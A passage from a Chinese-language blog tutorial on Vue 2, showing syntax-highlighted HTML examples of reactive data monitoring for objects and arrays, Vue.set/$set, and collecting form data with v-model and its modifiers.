class="string">&#x27;男&#x27;</span>)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="29-Vue监听数据改变原理-数组"><a href="#29-Vue监听数据改变原理-数组" class="headerlink" title="29.Vue监听数据改变原理_数组"></a>29.Vue监听数据改变原理_数组</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue监听数据改变原理_数组<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学校信息<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学生信息<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addSex&quot;</span>&gt;</span>添加一个性别属性，默认值是男<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>名字：&#123;&#123;student.name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">&quot;student.sex&quot;</span>&gt;</span>性别：&#123;&#123;student.sex&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>年龄：真实&#123;&#123;student.age.rAge&#125;&#125;,对外&#123;&#123;student.age.sAge&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>爱好：<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(h,index) in student.hobby&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;h&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>朋友们：<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(friend,index) in student.friends&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;friend.name&#125;&#125;-&#123;&#123;friend.age&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">address:<span class="string">&#x27;北京&#x27;</span>,</span></span><br><span class="line">student:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;小明&#x27;</span>,</span></span><br><span class="line">age:&#123;</span><br><span class="line">rAge:32,</span><br><span class="line">sAge:20,</span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript">hobby:[<span class="string">&#x27;抽烟&#x27;</span>,<span class="string">&#x27;喝酒&#x27;</span>,<span class="string">&#x27;烫头&#x27;</span>],</span></span><br><span class="line">friends:[</span><br><span class="line"><span class="javascript">&#123;<span class="attr">name</span>:<span class="string">&#x27;Jack&#x27;</span>,<span class="attr">age</span>:<span class="number">25</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">name</span>:<span class="string">&#x27;Tom&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>&#125;,</span></span><br><span class="line">],</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">addSex</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">// Vue.set(this.student,&#x27;sex&#x27;,&#x27;男&#x27;)</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.$set(<span class="built_in">this</span>.student,<span class="string">&#x27;sex&#x27;</span>,<span class="string">&#x27;男&#x27;</span>)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="30-总结Vue数据监测"><a href="#30-总结Vue数据监测" class="headerlink" title="30.总结Vue数据监测"></a>30.总结Vue数据监测</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>总结Vue数据监测<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Vue监视数据的原理：</span></span><br><span class="line"><span class="comment">1.Vue会监视data中所有层次的数据；</span></span><br><span class="line"><span class="comment">2.如何监测对象中的数据？</span></span><br><span class="line"><span class="comment">通过setter实现监测，且要在new Vue时就传入要监测的数据。</span></span><br><span class="line"><span class="comment">(1).对象中后追加的属性，Vue默认不做响应式处理；</span></span><br><span class="line"><span class="comment">(2).如需给后追加的属性做响应，需使用如下API：</span></span><br><span class="line"><span class="comment">Vue.set(target,propertyName/index,value)或</span></span><br><span class="line"><span class="comment">vm.$set(target,propertyName/index,value)</span></span><br><span class="line"><span class="comment">3.如何监测数组中的数据？</span></span><br><span class="line"><span class="comment">通过包裹数组更新元素的方法实现，本质就是做了两件事。</span></span><br><span class="line"><span class="comment">(1).调用原生对应的方法对数组进行更新；</span></span><br><span class="line"><span class="comment">(2).重新解析模板，进而更新页面；</span></span><br><span class="line"><span class="comment">4.在Vue修改数组的某个元素，一定要使用如下方法：</span></span><br><span class="line"><span class="comment">(1).使用这些API：push()、pop()、shift()、unshift()、splice()、sort()、reverse();</span></span><br><span class="line"><span class="comment">(2).Vue.set() 或 vm.$set;</span></span><br><span class="line"><span class="comment">5.特别注意：Vue.set() 或 vm.$set 不能给vm 或 vm的根数据对象 添加属性；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学生信息<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;student.age++&quot;</span>&gt;</span>年龄+1岁<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addSex&quot;</span>&gt;</span>添加性别属性，默认值男<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;student.sex = &#x27;未知&#x27; &quot;</span>&gt;</span>修改性别<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addFriend&quot;</span>&gt;</span>在列表首位添加一个朋友<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updateFirstFriendName&quot;</span>&gt;</span>修改第一个朋友的名字为张三<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addHobby&quot;</span>&gt;</span>添加一个爱好<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updateHobby&quot;</span>&gt;</span>修改第一个爱好为开车<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;removeSmoke&quot;</span>&gt;</span>过滤掉爱好中的抽烟<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>名字：&#123;&#123;student.name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>年龄：&#123;&#123;student.age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">&quot;student.sex&quot;</span>&gt;</span>性别：&#123;&#123;student.sex&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>爱好：<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(h,index) in student.hobby&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;h&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>朋友们：<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(friend,index) in student.friends&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;friend.name&#125;&#125;-&#123;&#123;friend.age&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line">student:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;小明&#x27;</span>,</span></span><br><span class="line">age:18,</span><br><span class="line"><span class="javascript">hobby:[<span class="string">&#x27;抽烟&#x27;</span>,<span class="string">&#x27;喝酒&#x27;</span>,<span class="string">&#x27;烫头&#x27;</span>],</span></span><br><span class="line">friends:[</span><br><span class="line"><span class="javascript">&#123;<span class="attr">name</span>:<span class="string">&#x27;Jack&#x27;</span>,<span class="attr">age</span>:<span class="number">25</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">name</span>:<span class="string">&#x27;Tom&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>&#125;,</span></span><br><span class="line">],</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">addSex</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">// Vue.set(this.student,&#x27;sex&#x27;,&#x27;男&#x27;)</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.$set(<span class="built_in">this</span>.student,<span class="string">&#x27;sex&#x27;</span>,<span class="string">&#x27;男&#x27;</span>)</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">addFriend</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.student.friends.unshift(&#123;<span class="attr">name</span>:<span class="string">&#x27;小华&#x27;</span>,<span class="attr">age</span>:<span class="number">27</span>&#125;)</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">updateFirstFriendName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.student.friends[<span class="number">0</span>].name = <span class="string">&#x27;张三&#x27;</span></span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">addHobby</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.student.hobby.push(<span class="string">&#x27;学习&#x27;</span>)</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">updateHobby</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">// this.student.hobby.splice(0,1,&#x27;开车&#x27;)</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// this.$set(this.student.hobby,0,&#x27;开车&#x27;)</span></span></span><br><span class="line"><span class="javascript">Vue.set(<span class="built_in">this</span>.student.hobby,<span class="number">0</span>,<span class="string">&#x27;开车&#x27;</span>)</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">removeSmoke</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.student.hobby = <span class="built_in">this</span>.student.hobby.filter(<span class="function">(<span class="params">h</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> h !== <span class="string">&#x27;抽烟&#x27;</span></span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="31-收集表单数据"><a href="#31-收集表单数据" class="headerlink" title="31.收集表单数据"></a>31.收集表单数据</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>收集表单数据<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">            收集表单数据：</span></span><br><span class="line"><span class="comment">                若：&lt;input type=&quot;text&quot;&gt;，则v-model收集的是value值，用户输入的也是value值。</span></span><br><span class="line"><span class="comment">                若：&lt;input type=&quot;radio&quot;&gt;，则v-model收集的是value值，且要给标签配置value值。</span></span><br><span class="line"><span class="comment">                若：&lt;input type=&quot;checkbox&quot;&gt;</span></span><br><span class="line"><span class="comment">                    1.没有配置input的value属性，那么v-model收集的是checked值（勾选 或 未勾选，是布尔值）</span></span><br><span class="line"><span class="comment">                    2.配置input的value属性：</span></span><br><span class="line"><span class="comment">                        (1).v-model的初始值是非数组，那么v-model收集的是checked值（勾选 或 未勾选，是布尔值）</span></span><br><span class="line"><span class="comment">                        (2).v-model的初始值是数组，那么v-model收集的就是value组成的数组</span></span><br><span class="line"><span class="comment">                备注，v-model的三个修饰符：</span></span><br><span class="line"><span class="comment">                    lazy：失去焦点在收集数据</span></span><br><span class="line"><span class="comment">                    number：输入字符串转为有效的数字</span></span><br><span class="line"><span class="comment">                    trim：输入的首尾空格过滤</span></span><br><span class="line"><span class="comment">         --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--准备一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> @<span class="attr">submit.prevent</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- &lt;label for=&quot;account&quot;&gt;账号：&lt;/label&gt;</span></span><br><span class="line"><span class="comment">                &lt;input type=&quot;text&quot; id=&quot;account&quot;&gt;&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="comment">                &lt;label for=&quot;password&quot;&gt;密码：&lt;/label&gt;</span></span><br><span class="line"><span class="comment">                &lt;input type=&quot;password&quot; id=&quot;password&quot;&gt; --&gt;</span></span><br><span class="line"></span><br><span class="line">                账号：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model.trim</span>=<span class="string">&quot;account&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                年龄：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">v-model.number</span>=<span class="string">&quot;age&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                性别：</span><br><span class="line">                男：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;男&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;sex&quot;</span>&gt;</span></span><br><span class="line">                女：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;女&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;sex&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                爱好：</span><br><span class="line">                学习<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;study&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span></span><br><span class="line">                打游戏<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;game&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span></span><br><span class="line">                吃饭<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;eat&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                所在校区：<span class="tag">&lt;<span class="name">select</span> <span class="attr">v-model</span>=<span class="string">&quot;city&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>请选择校区<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;beijing&quot;</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;shanghai&quot;</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;chengdu&quot;</span>&gt;</span>成都<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;shenzhen&quot;</span>&gt;</span>深圳<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;wuhan&quot;</span>&gt;</span>武汉<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                其他信息：</span><br><span class="line">                <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">v-model.lazy</span>=<span class="string">&quot;other&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;agree&quot;</span>&gt;</span> 阅读并接受<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>《用户协议》<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">       <span class="keyword">const</span> vm =  <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">account:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                password:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                age:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                sex:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line">                hobby:[],</span><br><span class="line"><span class="javascript">                city:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                other:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                agree:<span class="string">&#x27;&#x27;</span></span></span><br><span class="line">&#125;,</span><br><span class="line">            methods: &#123;</span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">demo</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="comment">// alert(this.account+&#x27; : &#x27;+this.password+&#x27; : &#x27;+this.sex+&#x27; : &#x27;+this.hobby</span></span></span><br><span class="line"><span class="javascript">                    <span class="comment">// +&#x27; : &#x27;+this.city+&#x27; : &#x27;+this.other+&#x27; : &#x27;+this.agree)</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">                    <span class="comment">// console.log(this.account+&#x27; : &#x27;+this.password+&#x27; : &#x27;+this.sex+&#x27; : &#x27;+this.hobby</span></span></span><br><span class="line"><span class="javascript">                    <span class="comment">// +&#x27; : &#x27;+this.city+&#x27; : &#x27;+this.other+&#x27; : &#x27;+this.agree)</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">                    <span class="comment">//将收集到的数据转为json格式输出</span></span></span><br><span class="line"><span class="javascript">                    <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(<span class="built_in">this</span>._data))</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="32-过滤器"><a href="#32-过滤器" class="headerlink" title="32.过滤器"></a>32.过滤器</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span 